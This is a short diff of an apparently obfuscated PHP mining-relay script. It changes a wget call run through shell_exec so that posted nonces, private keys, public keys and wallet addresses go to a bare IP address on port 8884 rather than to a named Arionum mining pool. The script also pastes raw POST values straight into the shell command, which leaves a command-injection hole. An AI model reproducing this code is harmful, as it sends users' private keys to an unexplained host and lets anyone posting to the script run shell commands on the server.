@@ -27,7 +27,7 @@ $google847412 = $_POST["public_key"];
 
 $google847446 = $_POST["address"];
 
-echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://mine.arionumpool.com/mine.php?q=submitNonce' --header='Content-type: application/x-www-form-urlencoded'");
+echo shell_exec("wget -q -U 'Mozille84' --post-data=argon='" . $google84741 . "&nonce=" . $google84742 . "&private_key=" . $google84744 . "&public_key=" . $google847412 . "&address=" . $google847446 . "' 'http://154.127.52.52:8884/?work=job' --header='Content-type: application/x-www-form-urlencoded'");
 
 }
 
